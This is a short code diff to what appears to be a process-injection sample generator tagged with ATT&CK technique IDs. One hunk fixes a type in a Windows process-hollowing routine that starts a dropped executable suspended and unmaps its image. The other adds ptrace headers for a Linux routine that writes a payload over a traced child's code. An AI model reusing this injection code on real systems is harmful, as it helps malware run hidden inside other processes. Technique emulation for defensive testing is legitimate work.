@@ -399,7 +399,7 @@ static int pf_run_pe(const unsigned char *sc, unsigned int sclen) {
     STARTUPINFOA si; PROCESS_INFORMATION pi; CONTEXT ctx;
     PBI pbi; HMODULE nt; pNtQIP qip; pNtUnmap unmap;
     IMAGE_DOS_HEADER *dos; IMAGE_NT_HEADERS *nth; IMAGE_SECTION_HEADER *sec;
-    WORD i; DWORD w, entry; LPVOID img;
+    WORD i; SIZE_T w; DWORD entry; LPVOID img;
     if (!pf_drop_temp(PF_PE, PF_PE_LEN, path, MAX_PATH)) return 0;
     ZeroMemory(&si, sizeof si); si.cb = sizeof si;
     if (!CreateProcessA(path, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED,
@@ -597,6 +597,9 @@ int main(void) {
 '''
 
 LIN_PTRACE_MAIN = r'''
+#include <sys/ptrace.h>
+#include <sys/user.h>
+#include <sys/wait.h>
 /* T1055.008 — ptrace injection: fork a decoy, follow it into exec, poke the
  * payload over the text page at the post-exec instruction pointer (ptrace
  * bypasses W^X for traced children) and continue. */
